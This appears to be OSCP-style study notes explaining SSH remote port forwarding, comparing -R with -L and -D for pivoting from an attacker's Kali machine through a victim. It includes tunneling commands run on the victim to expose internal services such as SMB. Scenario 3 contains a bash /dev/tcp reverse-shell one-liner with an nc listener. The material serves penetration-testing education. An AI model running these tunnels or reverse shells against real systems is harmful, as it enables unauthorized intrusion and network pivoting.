### SSH Remote Port Forwarding — Full Breakdown

---

### Syntax

bash

```bash
ssh -R [REMOTE_PORT]:[DESTINATION_IP]:[DESTINATION_PORT] [USER]@[YOUR_ATTACKER_IP]
```

---

### Breaking Down Each Part

```
ssh -R   8080  :  127.0.0.1  :  80    user@attacker_ip
          │            │          │         │
          │            │          │         └── Your attacker machine (SSH server)
          │            │          └──────────── Port of the destination service
          │            └─────────────────────── Destination IP
          │                                     (relative to VICTIM this time)
          └──────────────────────────────────── Port that opens on YOUR attacker machine
```

---

### The KEY Difference From -L

```
-L  →  YOU initiate SSH into victim
       YOU bring victim's port to your machine

-R  →  VICTIM initiates SSH out to you
       VICTIM pushes a port to your machine
```

```
-L   You ──SSH──► Victim        (you connect TO victim)
-R   Victim ──SSH──► You        (victim connects TO you)
```

---

### When Do You Use -R?

```
You CANNOT SSH into victim directly because:

├── Firewall blocks inbound SSH to victim
├── Victim is behind NAT
├── No direct route from you to victim
└── But victim CAN make outbound connections to you
```

```
CANNOT do this:
You ──SSH──► Victim ✗ (firewall blocks it)

CAN do this:
You ◄──SSH── Victim ✓ (victim connects out)
```

---

### Visual Flow

```
YOUR KALI (SSH Server)           VICTIM                  SERVICE
──────────────────────           ──────────────          ───────

                           victim runs:
                           ssh -R 8080:127.0.0.1:80
                                user@YOUR_IP
                                    │
                                    │ victim initiates
                                    │ SSH outbound ──────────────────►
                                    │                                 │
◄───────────────────────────────────┘                                 │
SSH tunnel established                                                │
Port 8080 opens                                                       │
ON YOUR MACHINE                                                       │
        │                                                             │
        │                                                             │
curl 127.0.0.1:8080                                                   │
        │                                                             │
        │── through SSH tunnel ──► victim receives ──► 127.0.0.1:80 ─┘
                                   "connect to
                                    127.0.0.1:80"
                                   (victim's own
                                    localhost)
```

---

### Three Scenarios

#### Scenario 1 — Victim exposes its own local service to you

bash

```bash
# Run ON VICTIM
ssh -R 8080:127.0.0.1:80 kali@YOUR_ATTACKER_IP
```

```
YOUR machine:8080 ──tunnel──► VICTIM:127.0.0.1:80
```

- Victim has a web app on its localhost port 80
- You can't SSH into victim
- Victim SSHes out to you and exposes its port 80
- Now `127.0.0.1:8080` on YOUR kali hits victim's internal web app

---

#### Scenario 2 — Victim exposes an internal network machine to you

bash

```bash
# Run ON VICTIM
ssh -R 4445:192.168.1.20:445 kali@YOUR_ATTACKER_IP
```

```
YOUR machine:4445 ──tunnel──► VICTIM ──► 192.168.1.20:445
                                          (internal host only
                                           victim can reach)
```

- `192.168.1.20` is deep inside the network
- Only victim can reach it
- Victim relays it out to you through the tunnel
- Now `127.0.0.1:4445` on your kali hits that internal SMB

---

#### Scenario 3 — Reverse shell callback (most common in OSCP)

bash

```bash
# On YOUR kali — start listener
nc -lvnp 4444

# On VICTIM — connect back to you
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

```
YOUR kali:4444 ◄──reverse shell── VICTIM
```

- This is technically `-R` concept
- Victim can't be connected TO
- So victim connects OUT to you
- You receive the shell on your listener

---

### -L vs -R vs -D All Together

```
YOU INITIATE SSH (normal access to victim)
───────────────────────────────────────────
-L  →  ssh -L LOCAL:DEST_IP:DEST_PORT user@VICTIM
       Opens port on YOUR machine
       Victim connects to destination

-D  →  ssh -D LOCAL_SOCKS_PORT user@VICTIM
       Opens SOCKS proxy on YOUR machine
       Victim proxies to anywhere


VICTIM INITIATES SSH (victim can't be reached)
───────────────────────────────────────────────
-R  →  ssh -R REMOTE:DEST_IP:DEST_PORT kali@YOUR_IP
       Opens port on YOUR machine
       Run FROM VICTIM outbound to you
```

---

### Key Mental Model for -R

```
        WHO RUNS THE COMMAND?         VICTIM runs it
        WHO OPENS THE PORT?           YOUR machine gets the port
        WHO IS THE SSH SERVER?        YOUR kali machine
        DESTINATION PERSPECTIVE?      Still relative to whoever runs the command (VICTIM)
```

---

### Setup Your Kali as SSH Server for -R

bash

```bash
# Make sure SSH server is running on your kali
sudo systemctl start ssh
sudo systemctl enable ssh

# Check it's listening
ss -tlnp | grep 22

# Now victim can SSH into your kali
# ssh -R 8080:127.0.0.1:80 kali@YOUR_IP
```

---

### Important — GatewayPorts

By default the port opened by `-R` only listens on **localhost** of your kali. To make it listen on all interfaces:

bash

```bash
# On YOUR kali /etc/ssh/sshd_config
GatewayPorts yes

# Restart SSH
sudo systemctl restart ssh
```

```
Without GatewayPorts:
Port 8080 opens on 127.0.0.1:8080 of your kali only
→ only YOU can use it locally

With GatewayPorts yes:
Port 8080 opens on 0.0.0.0:8080 of your kali
→ anyone can reach it (useful for team pivoting)
```

---

### One Line Summary Per Flag

```
-L  "I SSH into victim, bring their port to me"
     YOU run it, YOU reach victim's services

-R  "Victim SSHes into me, pushes their port to me"
     VICTIM runs it, can't be reached directly

-D  "I SSH into victim, they become my SOCKS proxy"
     YOU run it, reach victim's ENTIRE network
```